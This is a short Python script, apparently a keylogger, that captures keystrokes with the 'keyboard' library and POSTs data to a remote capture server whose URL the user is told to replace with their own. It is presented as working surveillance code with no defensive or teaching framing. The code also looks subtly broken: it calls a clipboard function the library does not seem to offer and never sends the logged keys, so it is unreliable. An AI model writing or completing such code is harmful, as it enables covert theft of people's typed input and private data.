import keyboard
import requests

# Function to send captured data to a remote server
def send_data(data):
    url = 'http://yourserver.com/capture'  # Replace with your server URL
    response = requests.post(url, data={'data': data})
    if response.status_code == 200:
        print("Data sent successfully")
    else:
        print("Failed to send data")

# Function to capture keystrokes
def capture_keystrokes():
    print("Starting keystroke capture...")
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if key == 'enter':
                send_data(keyboard.get_clipboard())
            elif key == 'esc':
                break
            else:
                print(key, end='', flush=True)

if __name__ == "__main__":
    capture_keystrokes()